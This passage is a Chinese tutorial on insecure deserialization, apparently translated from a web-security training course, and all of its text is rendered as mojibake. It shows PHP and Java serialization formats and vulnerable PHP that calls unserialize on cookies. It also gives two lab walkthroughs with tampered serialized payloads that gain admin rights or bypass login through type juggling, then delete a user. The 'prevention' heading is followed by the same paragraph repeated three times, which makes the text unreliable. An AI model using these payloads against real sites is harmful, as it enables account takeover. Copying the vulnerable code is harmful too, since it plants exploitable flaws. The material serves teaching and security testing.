<p>å°½ç®¡è®¸å¤šå®éªŒå’Œç¤ºä¾‹éƒ½åŸºäº PHPï¼Œä½†å¤§å¤šæ•°å¼€å‘æŠ€æœ¯å¯¹å…¶ä»–è¯­è¨€ä¹ŸåŒæ ·é€‚ç”¨ã€‚</p>
</blockquote>
<h3 id="å¦‚ä½•è¯†åˆ«ä¸å®‰å…¨çš„ååºåˆ—åŒ–">å¦‚ä½•è¯†åˆ«ä¸å®‰å…¨çš„ååºåˆ—åŒ–</h3>
<p>ä¸ç®¡æ˜¯ç™½ç›’æµ‹è¯•è¿˜æ˜¯é»‘ç›’æµ‹è¯•ï¼Œè¯†åˆ«ä¸å®‰å…¨çš„ååºåˆ—åŒ–éƒ½ç›¸å¯¹ç®€å•ã€‚</p>
<p>åœ¨å®¡è®¡è¿‡ç¨‹ä¸­ï¼Œä½ åº”è¯¥æŸ¥çœ‹æ‰€æœ‰ä¼ å…¥ç½‘ç«™çš„æ•°æ®ï¼Œå¹¶å°è¯•è¯†åˆ«ä»»ä½•çœ‹èµ·æ¥åƒåºåˆ—åŒ–æ•°æ®çš„ä¸œè¥¿ã€‚å¦‚æœäº†è§£ä¸åŒè¯­è¨€ä½¿ç”¨çš„æ ¼å¼ï¼Œåºåˆ—åŒ–æ•°æ®å°±èƒ½æ¯”è¾ƒå®¹æ˜“åœ°è¯†åˆ«å‡ºæ¥ã€‚åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†å±•ç¤º PHP å’Œ Java åºåˆ—åŒ–çš„ç¤ºä¾‹ã€‚ä¸€æ—¦è¯†åˆ«å‡ºåºåˆ—åŒ–æ•°æ®ï¼Œå°±å¯ä»¥æµ‹è¯•æ˜¯å¦èƒ½å¤Ÿæ§åˆ¶å®ƒã€‚</p>
<blockquote>
<p><strong>Tip</strong></p>
<p>å¯¹äº Burp Suite Professional çš„ç”¨æˆ·ï¼ŒBurp Scanner ä¼šè‡ªåŠ¨æ ‡è®°ä»»ä½•çœ‹èµ·æ¥åŒ…å«åºåˆ—åŒ–å¯¹è±¡çš„ HTTP æ¶ˆæ¯ã€‚</p>
</blockquote>
<h3 id="PHP-åºåˆ—åŒ–æ ¼å¼">PHP åºåˆ—åŒ–æ ¼å¼</h3>
<p>PHP ä½¿ç”¨çš„å¤§å¤šæ˜¯äººç±»å¯è¯»çš„å­—ç¬¦ä¸²æ ¼å¼ï¼Œå­—æ¯ä»£è¡¨æ•°æ®ç±»å‹ï¼Œæ•°å­—ä»£è¡¨æ¯ä¸ªæ¡ç›®çš„é•¿åº¦ã€‚ä¾‹å¦‚ï¼Œç”¨æˆ·å¯¹è±¡çš„å±æ€§ä¸º</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$user</span>-&gt;name = <span class="string">&quot;carlos&quot;</span>;</span><br><span class="line"><span class="variable">$user</span>-&gt;isLoggedIn = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure>
<p>åºåˆ—åŒ–åï¼Œè¯¥å¯¹è±¡çš„å¤–è§‚å¯èƒ½å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>:s:<span class="number">6</span>:<span class="string">&quot;carlos&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;isLoggedIn&quot;</span>:b:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™å¯ä»¥è§£é‡Šä¸ºï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>O:4: &quot;User&quot;</code> - å…·æœ‰ 4 ä¸ªå­—ç¬¦ç±»å <code>&quot;User&quot;</code> çš„å¯¹è±¡</p>
</li>
<li class="lvl-2">
<p><code>2</code> - è¯¥å¯¹è±¡æœ‰ 2 ä¸ªå±æ€§</p>
</li>
<li class="lvl-2">
<p><code>s:4: &quot;name&quot;</code> - ç¬¬ä¸€ä¸ªå±æ€§çš„é”®æ˜¯ 4 ä¸ªå­—ç¬¦çš„å­—ç¬¦ä¸² <code>â€œnameâ€</code>ã€‚</p>
</li>
<li class="lvl-2">
<p><code>s:6: &quot;carlos&quot;</code> - ç¬¬ä¸€ä¸ªå±æ€§çš„å€¼æ˜¯ 6 ä¸ªå­—ç¬¦çš„å­—ç¬¦ä¸² <code>â€œcarlosâ€</code>ã€‚</p>
</li>
<li class="lvl-2">
<p><code>s:10: &quot;isLoggedIn&quot;</code> - ç¬¬äºŒä¸ªå±æ€§çš„é”®æ˜¯ 10 ä¸ªå­—ç¬¦çš„å­—ç¬¦ä¸² â€œisLoggedInâ€ã€‚</p>
</li>
<li class="lvl-2">
<p><code>b:1</code> - ç¬¬äºŒä¸ªå±æ€§çš„å€¼æ˜¯å¸ƒå°”å€¼ <code>true</code></p>
</li>
</ul>
<p>PHP åºåˆ—åŒ–çš„æœ¬åœ°æ–¹æ³•æ˜¯ <code>serialize() </code>å’Œ <code>unserialize()</code>ã€‚å¦‚æœå¯ä»¥è®¿é—®æºä»£ç ï¼Œå°±åº”è¯¥å…ˆåœ¨ä»£ç ä¸­æŸ¥æ‰¾ <code>unserialize()</code>ï¼Œç„¶åè¿›ä¸€æ­¥ç ”ç©¶ã€‚</p>
<h3 id="Java-åºåˆ—åŒ–æ ¼å¼">Java åºåˆ—åŒ–æ ¼å¼</h3>
<p>æœ‰äº›è¯­è¨€ï¼ˆå¦‚ Javaï¼‰ä½¿ç”¨äºŒè¿›åˆ¶åºåˆ—åŒ–æ ¼å¼ã€‚è¿™ç§æ ¼å¼æ›´éš¾è¯»å–ï¼Œä½†å¦‚æœçŸ¥é“å¦‚ä½•è¯†åˆ«ä¸€äº›è››ä¸é©¬è¿¹ï¼Œè¿˜æ˜¯å¯ä»¥è¯†åˆ«åºåˆ—åŒ–æ•°æ®çš„ã€‚ä¾‹å¦‚ï¼Œåºåˆ—åŒ–çš„ Java å¯¹è±¡æ€»æ˜¯ä»¥ç›¸åŒçš„å­—èŠ‚å¼€å§‹ï¼Œåœ¨åå…­è¿›åˆ¶ä¸­ç¼–ç ä¸º <code>aced</code>ï¼Œåœ¨ Base64 ä¸­ç¼–ç ä¸º <code>rO0</code>ã€‚</p>
<p>ä»»ä½•å®ç°äº† <code>java.io.Serializable</code> æ¥å£çš„ç±»éƒ½å¯ä»¥è¢«åºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚å¦‚æœæ‚¨å¯ä»¥è®¿é—®æºä»£ç ï¼Œè¯·æ³¨æ„ä»»ä½•ä½¿ç”¨ <code>readObject()</code> æ–¹æ³•çš„ä»£ç ï¼Œè¯¥æ–¹æ³•ç”¨äºä» <code>InputStream</code> ä¸­è¯»å–å’Œååºåˆ—åŒ–æ•°æ®ã€‚</p>
<h3 id="æ“ä½œåºåˆ—åŒ–å¯¹è±¡">æ“ä½œåºåˆ—åŒ–å¯¹è±¡</h3>
<p>åˆ©ç”¨æŸäº›ååºåˆ—åŒ–æ¼æ´å°±åƒæ›´æ”¹åºåˆ—åŒ–å¯¹è±¡ä¸­çš„ä¸€ä¸ªå±æ€§ä¸€æ ·ç®€å•ã€‚ç”±äºå¯¹è±¡çŠ¶æ€æ˜¯æŒä¹…åŒ–çš„ï¼Œå› æ­¤å¯ä»¥é€šè¿‡ç ”ç©¶åºåˆ—åŒ–æ•°æ®æ¥è¯†åˆ«å’Œç¼–è¾‘æœ‰è¶£çš„å±æ€§å€¼ã€‚ç„¶åï¼Œæ‚¨å°±å¯ä»¥é€šè¿‡ç½‘ç«™çš„ååºåˆ—åŒ–è¿‡ç¨‹å°†æ¶æ„å¯¹è±¡ä¼ å…¥ç½‘ç«™ã€‚è¿™æ˜¯åŸºæœ¬ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨çš„ç¬¬ä¸€æ­¥ã€‚</p>
<p>ä¸€èˆ¬æ¥è¯´ï¼Œåœ¨æ“ä½œåºåˆ—åŒ–å¯¹è±¡æ—¶æœ‰ä¸¤ç§æ–¹æ³•ã€‚ä¸€ç§æ˜¯ç›´æ¥ç¼–è¾‘å­—èŠ‚æµå½¢å¼çš„å¯¹è±¡ï¼Œå¦ä¸€ç§æ˜¯ç”¨ç›¸åº”çš„è¯­è¨€ç¼–å†™ç®€çŸ­çš„è„šæœ¬ï¼Œè‡ªå·±åˆ›å»ºæ–°å¯¹è±¡å¹¶å°†å…¶åºåˆ—åŒ–ã€‚åœ¨å¤„ç†äºŒè¿›åˆ¶åºåˆ—åŒ–æ ¼å¼æ—¶ï¼Œåä¸€ç§æ–¹æ³•é€šå¸¸æ›´ä¸ºç®€ä¾¿ã€‚</p>
<h4 id="ä¿®æ”¹å¯¹è±¡å±æ€§">ä¿®æ”¹å¯¹è±¡å±æ€§</h4>
<p>åœ¨ç¯¡æ”¹æ•°æ®æ—¶ï¼Œåªè¦æ”»å‡»è€…ä¿ç•™äº†ä¸€ä¸ªæœ‰æ•ˆçš„åºåˆ—åŒ–å¯¹è±¡ï¼Œååºåˆ—åŒ–è¿‡ç¨‹å°±ä¼šåˆ›å»ºä¸€ä¸ªå¸¦æœ‰ä¿®æ”¹åå±æ€§å€¼çš„æœåŠ¡å™¨ç«¯å¯¹è±¡ã€‚</p>
<p>ä¸¾ä¸ªç®€å•çš„ä¾‹å­ï¼Œä¸€ä¸ªç½‘ç«™ä½¿ç”¨åºåˆ—åŒ–çš„ <code>User</code> å¯¹è±¡åœ¨ cookie ä¸­å­˜å‚¨ç”¨æˆ·ä¼šè¯æ•°æ®ã€‚å¦‚æœæ”»å‡»è€…åœ¨ HTTP è¯·æ±‚ä¸­å‘ç°äº†è¿™ä¸ªåºåˆ—åŒ–å¯¹è±¡ï¼Œä»–ä»¬å¯èƒ½ä¼šå¯¹å…¶è¿›è¡Œè§£ç ï¼Œå‘ç°ä»¥ä¸‹å­—èŠ‚æµï¼š</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;carlos&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;isAdmin&quot;</span>;b:<span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure>
<p><code>isAdmin</code> å±æ€§æ˜¯ä¸€ä¸ªæ˜æ˜¾çš„å…³æ³¨ç‚¹ã€‚æ”»å‡»è€…åªéœ€å°†è¯¥å±æ€§çš„å¸ƒå°”å€¼æ”¹ä¸º <code>1</code>ï¼ˆtrueï¼‰ï¼Œé‡æ–°ç¼–ç å¯¹è±¡ï¼Œç„¶åç”¨ä¿®æ”¹åçš„å€¼è¦†ç›–å½“å‰ cookie å³å¯ã€‚å•ç‹¬æ¥çœ‹ï¼Œè¿™ä¸ä¼šäº§ç”Ÿä»»ä½•å½±å“ã€‚ä½†æ˜¯ï¼Œå‡è®¾ç½‘ç«™ä½¿ç”¨æ­¤ cookie æ¥æ£€æŸ¥å½“å‰ç”¨æˆ·æ˜¯å¦æœ‰è®¿é—®æŸäº›ç®¡ç†åŠŸèƒ½çš„æƒé™ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$user</span>-&gt;isAdmin === <span class="literal">true</span>) &#123;</span><br><span class="line"><span class="comment">// allow access to admin interface</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™æ®µæœ‰æ¼æ´çš„ä»£ç ä¼šæ ¹æ® cookie ä¸­çš„æ•°æ®ï¼ˆåŒ…æ‹¬æ”»å‡»è€…ä¿®æ”¹è¿‡çš„ <code>isAdmin</code> å±æ€§ï¼‰å®ä¾‹åŒ–ä¸€ä¸ª<code>User</code>å¯¹è±¡ã€‚åœ¨ä»»ä½•æ—¶å€™éƒ½ä¸ä¼šæ£€æŸ¥åºåˆ—åŒ–å¯¹è±¡çš„çœŸå®æ€§ã€‚ç„¶åï¼Œè¿™äº›æ•°æ®ä¼šè¢«ä¼ é€’åˆ°æ¡ä»¶è¯­å¥ä¸­ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå°±å¯ä»¥è½»æ¾å®ç°æƒé™å‡çº§ã€‚</p>
<p>è¿™ç§ç®€å•çš„æƒ…å†µåœ¨å®é™…åº”ç”¨ä¸­å¹¶ä¸å¸¸è§ã€‚ä¸è¿‡ï¼Œä»¥è¿™ç§æ–¹å¼ç¼–è¾‘å±æ€§å€¼ï¼Œå±•ç¤ºäº†è·å–ä¸å®‰å…¨ååºåˆ—åŒ–æ‰€æš´éœ²çš„å¤§é‡æ”»å‡»é¢çš„ç¬¬ä¸€æ­¥ã€‚</p>
<h4 id="Labï¼šä¿®æ”¹åºåˆ—åŒ–å¯¹è±¡">Labï¼šä¿®æ”¹åºåˆ—åŒ–å¯¹è±¡</h4>
<p>æœ¬å®éªŒä½¿ç”¨äº†åŸºäºåºåˆ—åŒ–çš„ä¼šè¯æœºåˆ¶ï¼Œå› æ­¤å­˜åœ¨æƒé™å‡çº§æ¼æ´ã€‚è¦è§£å†³è¯¥å®éªŒé—®é¢˜ï¼Œè¯·ç¼–è¾‘ä¼šè¯ cookie ä¸­çš„åºåˆ—åŒ–å¯¹è±¡ï¼Œåˆ©ç”¨æ­¤æ¼æ´è·å¾—ç®¡ç†æƒé™ã€‚ç„¶ååˆ é™¤ç”¨æˆ· carlosã€‚</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>ä½¿ç”¨è‡ªå·±çš„å‡­æ®ç™»å½•ã€‚è¯·æ³¨æ„ï¼Œç™»å½•åçš„ <code>GET /my-account</code> è¯·æ±‚åŒ…å«ä¸€ä¸ªä¼šè¯ cookieï¼Œå®ƒä¼¼ä¹æ˜¯ URL å’Œ Base64 ç¼–ç çš„ã€‚</p>
</li>
<li class="lvl-2">
<p>ä½¿ç”¨ Burp çš„ Inspector é¢æ¿ç ”ç©¶è¯·æ±‚çš„è§£ç å½¢å¼ã€‚è¯·æ³¨æ„ï¼Œcookie å®é™…ä¸Šæ˜¯ä¸€ä¸ªåºåˆ—åŒ–çš„ PHP å¯¹è±¡ã€‚admin å±æ€§åŒ…å« b:0ï¼Œè¡¨ç¤ºå¸ƒå°”å€¼ falseã€‚å°†æ­¤è¯·æ±‚å‘é€åˆ° Burp Repeaterã€‚</p>
</li>
<li class="lvl-2">
<p>åœ¨ Burp Repeater ä¸­ï¼Œä½¿ç”¨æ£€æŸ¥å™¨å†æ¬¡æ£€æŸ¥ cookieï¼Œå¹¶å°† admin å±æ€§çš„å€¼æ›´æ”¹ä¸º b:1ã€‚ç‚¹å‡» â€œåº”ç”¨æ›´æ”¹â€ã€‚ä¿®æ”¹åçš„å¯¹è±¡å°†è‡ªåŠ¨é‡æ–°ç¼–ç å¹¶æ›´æ–°åˆ°è¯·æ±‚ä¸­ã€‚</p>
</li>
<li class="lvl-2">
<p>å‘é€è¯·æ±‚ã€‚è¯·æ³¨æ„ï¼Œå“åº”ä¸­ç°åœ¨åŒ…å«äº†ä¸€ä¸ªæŒ‡å‘ /admin ç®¡ç†é¢æ¿çš„é“¾æ¥ï¼Œè¡¨æ˜æ‚¨å·²ä½¿ç”¨ç®¡ç†å‘˜æƒé™è®¿é—®äº†è¯¥é¡µé¢ã€‚</p>
</li>
<li class="lvl-2">
<p>å°†è¯·æ±‚è·¯å¾„æ”¹ä¸º /adminï¼Œç„¶åé‡æ–°å‘é€ã€‚æ³¨æ„ /admin é¡µé¢åŒ…å«åˆ é™¤ç‰¹å®šç”¨æˆ·è´¦æˆ·çš„é“¾æ¥ã€‚</p>
</li>
<li class="lvl-2">
<p>å°†è¯·æ±‚è·¯å¾„æ›´æ”¹ä¸º /admin/delete?username=carlosï¼Œç„¶åå‘é€è¯·æ±‚ä»¥è§£å†³å®éªŒå®¤é—®é¢˜ã€‚</p>
</li>
</ul>
<h4 id="ä¿®æ”¹æ•°æ®ç±»å‹">ä¿®æ”¹æ•°æ®ç±»å‹</h4>
<p>æˆ‘ä»¬å·²ç»çœ‹åˆ°äº†å¦‚ä½•ä¿®æ”¹åºåˆ—åŒ–å¯¹è±¡ä¸­çš„å±æ€§å€¼ï¼Œä½†ä¹Ÿæœ‰å¯èƒ½æä¾›æ„æƒ³ä¸åˆ°çš„æ•°æ®ç±»å‹ã€‚</p>
<p>ç”±äºåœ¨æ¯”è¾ƒä¸åŒæ•°æ®ç±»å‹æ—¶ä½¿ç”¨äº†æ¾æ•£æ¯”è¾ƒè¿ç®—ç¬¦ (==)ï¼ŒåŸºäº PHP çš„é€»è¾‘ç‰¹åˆ«å®¹æ˜“å—åˆ°è¿™ç§æ“ä½œçš„å½±å“ã€‚ä¾‹å¦‚ï¼Œå¦‚æœåœ¨æ•´æ•°å’Œå­—ç¬¦ä¸²ä¹‹é—´è¿›è¡Œæ¾æ•£æ¯”è¾ƒï¼ŒPHP ä¼šå°è¯•å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ•´æ•°ï¼Œè¿™æ„å‘³ç€ 5 == â€œ5â€ çš„å€¼ä¸º trueã€‚</p>
<h2 id="å¦‚ä½•é˜²æ­¢ä¸å®‰å…¨çš„ååºåˆ—åŒ–æ¼æ´">å¦‚ä½•é˜²æ­¢ä¸å®‰å…¨çš„ååºåˆ—åŒ–æ¼æ´</h2>
<p>ä¸€èˆ¬æ¥è¯´ï¼Œé™¤éç»å¯¹å¿…è¦ï¼Œå¦åˆ™åº”é¿å…å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œååºåˆ—åŒ–ã€‚åœ¨è®¸å¤šæƒ…å†µä¸‹ï¼Œååºåˆ—åŒ–å¯èƒ½å¸¦æ¥çš„é«˜ä¸¥é‡æ€§æ¼æ´ï¼Œä»¥åŠé˜²èŒƒè¿™äº›æ¼æ´çš„éš¾åº¦ï¼Œéƒ½è¶…è¿‡äº†ååºåˆ—åŒ–çš„å¥½å¤„ã€‚</p>
<p>ç”±äºåœ¨æ¯”è¾ƒä¸åŒæ•°æ®ç±»å‹æ—¶ä½¿ç”¨äº†æ¾æ•£æ¯”è¾ƒè¿ç®—ç¬¦ (==)ï¼ŒåŸºäº PHP çš„é€»è¾‘ç‰¹åˆ«å®¹æ˜“å—åˆ°è¿™ç§æ“ä½œçš„å½±å“ã€‚ä¾‹å¦‚ï¼Œå¦‚æœåœ¨æ•´æ•°å’Œå­—ç¬¦ä¸²ä¹‹é—´è¿›è¡Œæ¾æ•£æ¯”è¾ƒï¼ŒPHP ä¼šå°è¯•å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ•´æ•°ï¼Œè¿™æ„å‘³ç€ 5 == â€œ5â€ çš„å€¼ä¸º trueã€‚</p>
<p>ç”±äºåœ¨æ¯”è¾ƒä¸åŒæ•°æ®ç±»å‹æ—¶ä½¿ç”¨äº†æ¾æ•£æ¯”è¾ƒè¿ç®—ç¬¦ (<code>==</code>)ï¼ŒåŸºäº PHP çš„é€»è¾‘ç‰¹åˆ«å®¹æ˜“å—åˆ°è¿™ç§æ“ä½œçš„å½±å“ã€‚ä¾‹å¦‚ï¼Œå¦‚æœåœ¨æ•´æ•°å’Œå­—ç¬¦ä¸²ä¹‹é—´è¿›è¡Œæ¾æ•£æ¯”è¾ƒï¼ŒPHP ä¼šå°è¯•å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ•´æ•°ï¼Œè¿™æ„å‘³ç€ <code>5 == â€œ5â€</code> çš„å€¼ä¸º <code>true</code>ã€‚</p>
<p>ä¸åŒå¯»å¸¸çš„æ˜¯ï¼Œè¿™ä¹Ÿé€‚ç”¨äºä»»ä½•ä»¥æ•°å­—å¼€å¤´çš„å­—æ¯æ•°å­—å­—ç¬¦ä¸²ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒPHP å°†æ ¹æ®å¼€å¤´çš„æ•°å­—æœ‰æ•ˆåœ°å°†æ•´ä¸ªå­—ç¬¦ä¸²è½¬æ¢ä¸ºæ•´æ•°å€¼ã€‚å­—ç¬¦ä¸²çš„å…¶ä½™éƒ¨åˆ†å°†è¢«å®Œå…¨å¿½ç•¥ã€‚å› æ­¤ï¼Œ<code>5 == &quot;5 of something&quot;</code> å®é™…ä¸Šè¢«è§†ä¸º <code>5 == 5</code>ã€‚</p>
<p>åŒæ ·ï¼Œåœ¨ PHP 7.x åŠæ›´æ—©ç‰ˆæœ¬ä¸­ï¼Œæ¯”è¾ƒ <code>0 == &quot;Example string&quot;</code> çš„ç»“æœä¸º <code>true</code>ï¼Œå› ä¸º PHP å°†æ•´ä¸ªå­—ç¬¦ä¸²è§†ä¸ºæ•´æ•° <code>0</code>ã€‚</p>
<p>è€ƒè™‘å°†è¿™ç§æ¾æ•£çš„æ¯”è¾ƒè¿ç®—ç¬¦ä¸æ¥è‡ªååºåˆ—åŒ–å¯¹è±¡çš„ç”¨æˆ·å¯æ§æ•°æ®ç»“åˆä½¿ç”¨çš„æƒ…å†µã€‚è¿™æœ‰å¯èƒ½å¯¼è‡´å±é™©çš„é€»è¾‘ç¼ºé™·ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$login</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>)</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$login</span>[<span class="string">&#x27;password&#x27;</span>] == <span class="variable">$password</span>) &#123;</span><br><span class="line"><span class="comment">// log in successfully</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å‡è®¾æ”»å‡»è€…ä¿®æ”¹äº†å¯†ç å±æ€§ï¼Œä½¿å…¶åŒ…å«æ•´æ•° <code>0</code>ï¼Œè€Œä¸æ˜¯é¢„æœŸçš„å­—ç¬¦ä¸²ã€‚åªè¦å­˜å‚¨çš„å¯†ç ä¸æ˜¯ä»¥æ•°å­—å¼€å¤´ï¼Œè¯¥æ¡ä»¶å°±ä¼šå§‹ç»ˆè¿”å› <code>true</code>ï¼Œä»è€Œå®ç°èº«ä»½éªŒè¯ç»•è¿‡ã€‚è¯·æ³¨æ„ï¼Œè¿™åªæ˜¯å› ä¸ºååºåˆ—åŒ–ä¿ç•™äº†æ•°æ®ç±»å‹ã€‚å¦‚æœä»£ç ç›´æ¥ä»è¯·æ±‚ä¸­è·å–å¯†ç ï¼Œ<code>0</code> å°†è¢«è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œæ¡ä»¶å°†è¿”å› <code>false</code>ã€‚</p>
<blockquote>
<p><strong>Note</strong></p>
<p>åœ¨ PHP 8 åŠä»¥åçš„ç‰ˆæœ¬ä¸­ï¼Œ0 == â€œExample string â€æ¯”è¾ƒç»“æœä¸º falseï¼Œå› ä¸ºåœ¨æ¯”è¾ƒè¿‡ç¨‹ä¸­å­—ç¬¦ä¸²ä¸å†éšå¼è½¬æ¢ä¸º 0ã€‚å› æ­¤ï¼Œåœ¨è¿™äº›ç‰ˆæœ¬çš„ PHP ä¸­æ— æ³•ä½¿ç”¨æ­¤æ¼æ´ã€‚</p>
<p>æ¯”è¾ƒä»¥æ•°å­—å¼€å¤´çš„å­—æ¯æ•°å­—å­—ç¬¦ä¸²çš„è¡Œä¸ºåœ¨ PHP 8 ä¸­ä¿æŒä¸å˜ã€‚å› æ­¤ï¼Œ5 == <code>â€œ5 of something â€</code>ä»è¢«è§†ä¸º <code>5 == 5</code>ã€‚</p>
</blockquote>
<p>è¯·æ³¨æ„ï¼Œåœ¨ä¿®æ”¹ä»»ä½•åºåˆ—åŒ–å¯¹è±¡æ ¼å¼ä¸­çš„æ•°æ®ç±»å‹æ—¶ï¼Œä¸€å®šè¦è®°å¾—æ›´æ–°åºåˆ—åŒ–æ•°æ®ä¸­çš„ä»»ä½•ç±»å‹æ ‡ç­¾å’Œé•¿åº¦æŒ‡ç¤ºç¬¦ã€‚å¦åˆ™ï¼Œåºåˆ—åŒ–å¯¹è±¡å°†è¢«æŸåï¼Œæ— æ³•è¿›è¡Œååºåˆ—åŒ–ã€‚</p>
<h4 id="Labï¼š-ä¿®æ”¹åºåˆ—åŒ–æ•°æ®ç±»å‹">Labï¼š ä¿®æ”¹åºåˆ—åŒ–æ•°æ®ç±»å‹</h4>
<p>æœ¬å®éªŒä½¿ç”¨äº†åŸºäºåºåˆ—åŒ–çš„ä¼šè¯æœºåˆ¶ï¼Œå› æ­¤å®¹æ˜“å‘ç”Ÿèº«ä»½éªŒè¯ç»•è¿‡ã€‚è¦è§£å†³è¯¥å®éªŒé—®é¢˜ï¼Œè¯·ç¼–è¾‘ä¼šè¯ cookie ä¸­çš„åºåˆ—åŒ–å¯¹è±¡ï¼Œä»¥è®¿é—®<code>administrator</code>è´¦æˆ·ã€‚ç„¶ååˆ é™¤ç”¨æˆ· <code>carlos</code>ã€‚</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>ä½¿ç”¨è‡ªå·±çš„å‡­æ®ç™»å½•ã€‚åœ¨ Burp ä¸­ï¼Œæ‰“å¼€ç™»å½•åçš„ <code>GET /my-account</code> è¯·æ±‚ï¼Œå¹¶ä½¿ç”¨æ£€æŸ¥å™¨æ£€æŸ¥ä¼šè¯ cookieï¼Œä»¥æ˜¾ç¤ºåºåˆ—åŒ–çš„ PHP å¯¹è±¡ã€‚å°†æ­¤è¯·æ±‚å‘é€åˆ° Burp Repeaterã€‚</p>
</li>
<li class="lvl-2">
<p>åœ¨ Burp Repeater ä¸­ï¼Œä½¿ç”¨æ£€æŸ¥å™¨é¢æ¿å¯¹ä¼šè¯ cookie è¿›è¡Œå¦‚ä¸‹ä¿®æ”¹ï¼š</p>
<ul class="lvl-2">
<li class="lvl-4">
<p>å°†ç”¨æˆ·åå±æ€§çš„é•¿åº¦æ›´æ–°ä¸º 13ã€‚</p>
</li>
<li class="lvl-4">
<p>å°†ç”¨æˆ·åæ”¹ä¸ºç®¡ç†å‘˜ã€‚</p>
</li>
<li class="lvl-4">
<p>å°†è®¿é—®ä»¤ç‰Œæ›´æ”¹ä¸ºæ•´æ•° 0ã€‚ ç”±äºè¿™ä¸å†æ˜¯å­—ç¬¦ä¸²ï¼Œå› æ­¤è¿˜éœ€è¦åˆ é™¤å€¼å‘¨å›´çš„åŒå¼•å·ã€‚</p>
</li>
<li class="lvl-4">
<p>å°† s æ›¿æ¢ä¸º iï¼Œæ›´æ–°è®¿é—®ä»¤ç‰Œçš„æ•°æ®ç±»å‹æ ‡ç­¾ã€‚</p>
</li>
</ul>
</li>
</ul>
<p>ç»“æœåº”è¯¥æ˜¯è¿™æ ·çš„:</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">13</span>:<span class="string">&quot;administrator&quot;</span>;s:<span class="number">12</span>:<span class="string">&quot;access_token&quot;</span>;i:<span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p>å•å‡» â€œåº”ç”¨æ›´æ”¹â€ã€‚ä¿®æ”¹åçš„å¯¹è±¡å°†è‡ªåŠ¨é‡æ–°ç¼–ç å¹¶æ›´æ–°åˆ°è¯·æ±‚ä¸­ã€‚</p>
</li>
<li class="lvl-2">
<p>å‘é€è¯·æ±‚ã€‚è¯·æ³¨æ„ï¼Œå“åº”ä¸­ç°åœ¨åŒ…å«ä¸€ä¸ªæŒ‡å‘ <code>/admin</code> ç®¡ç†é¢æ¿çš„é“¾æ¥ï¼Œè¡¨æ˜æ‚¨å·²æˆåŠŸä»¥ç®¡ç†å‘˜ç”¨æˆ·èº«ä»½è®¿é—®è¯¥é¡µé¢ã€‚</p>
</li>
<li class="lvl-2">
<p>å°†è¯·æ±‚è·¯å¾„æ”¹ä¸º <code>/admin</code>ï¼Œç„¶åé‡æ–°å‘é€ã€‚æ³¨æ„<code> /admin</code> é¡µé¢åŒ…å«åˆ é™¤ç‰¹å®šç”¨æˆ·è´¦æˆ·çš„é“¾æ¥ã€‚</p>
</li>
<li class="lvl-2">
<p>å°†è¯·æ±‚è·¯å¾„æ›´æ”¹ä¸º<code> /admin/delete?username=carlos</code>ï¼Œç„¶åå‘é€è¯·æ±‚ä»¥è§£å†³å®éªŒå®¤é—®é¢˜ã€‚</p>
</li>
</ul>
<p>åœ¨ç›´æ¥å¤„ç†äºŒè¿›åˆ¶æ ¼å¼æ—¶ï¼Œæˆ‘ä»¬å»ºè®®ä½¿ç”¨ BApp å•†åº—æä¾›çš„ Hackvertor æ‰©å±•ã€‚ä½¿ç”¨ Hackvertorï¼Œä½ å¯ä»¥å°†åºåˆ—åŒ–æ•°æ®ä¿®æ”¹ä¸ºå­—ç¬¦ä¸²ï¼Œå®ƒä¼šè‡ªåŠ¨æ›´æ–°äºŒè¿›åˆ¶æ•°æ®ï¼Œå¹¶ç›¸åº”è°ƒæ•´åç§»é‡ã€‚è¿™æ ·å¯ä»¥èŠ‚çœå¤§é‡çš„æ‰‹åŠ¨æ“ä½œã€‚</p>
<h2 id="ä½¿ç”¨åº”ç”¨ç¨‹åºåŠŸèƒ½">ä½¿ç”¨åº”ç”¨ç¨‹åºåŠŸèƒ½</h2>
